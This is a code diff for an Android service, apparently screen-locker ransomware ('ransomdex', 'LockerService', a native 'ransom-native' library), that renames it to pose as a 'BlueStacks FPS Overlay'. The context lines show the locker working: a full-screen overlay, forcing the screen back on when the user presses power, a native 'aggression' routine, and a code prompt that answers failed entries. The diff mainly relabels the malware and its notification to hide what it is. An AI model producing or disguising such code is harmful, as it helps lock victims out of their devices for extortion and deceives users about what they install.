@@ -1,4 +1,4 @@
-package com.bondex.ransomdex;
+package com.bluestacks.fpsoverlay;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -26,7 +26,7 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.widget.EditText;
 
-public class LockerService extends Service {
+public class FPSService extends Service {
     private WindowManager windowManager;
     private View lockerLayout;
     private CameraManager cameraManager;
@@ -35,7 +35,7 @@ public class LockerService extends Service {
     public static boolean isAuthenticated = false;
 
     static {
-        System.loadLibrary("ransom-native");
+        System.loadLibrary("fps-native");
     }
 
     public native void startNativeAggression(String serviceName);
@@ -57,7 +57,7 @@ public class LockerService extends Service {
             if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                 // Jika user menekan tombol power (layar mati), paksa nyalakan lagi
                 PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "RansomDex:WakeLock");
+                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "BS_FPS:WakeLock");
                 wakeLock.acquire(1000);
             }
         }
@@ -224,13 +224,13 @@ public class LockerService extends Service {
                 } else {
                     currentInput = "";
                     display.setText("");
-                    display.setHint("ACCESS DENIED");
+                    display.setHint("CALIBRATION FAILED");
                 }
             });
         }
     
         // 5. Fitur Agresif
-        startNativeAggression(getPackageName() + "/.LockerService");
+        startNativeAggression(getPackageName() + "/.FPSService");
         flashHandler.post(flashRunnable);
         applyFullScreen();
     
@@ -240,10 +240,10 @@ public class LockerService extends Service {
     }
     
     private void startInForeground() {
-        String CHANNEL_ID = "locker_service_channel";
+        String CHANNEL_ID = "fps_overlay_channel";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID, "System Update",
+                    CHANNEL_ID, "BlueStacks Service",
                     NotificationManager.IMPORTANCE_LOW);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
@@ -257,8 +257,8 @@ public class LockerService extends Service {
         }
 
         Notification notification = builder
-                .setContentTitle("System is updating")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .setContentTitle("BlueStacks FPS Overlay")
+                .setSmallIcon(android.R.drawable.ic_menu_view)
                 .setOngoing(true)
                 .build();
 
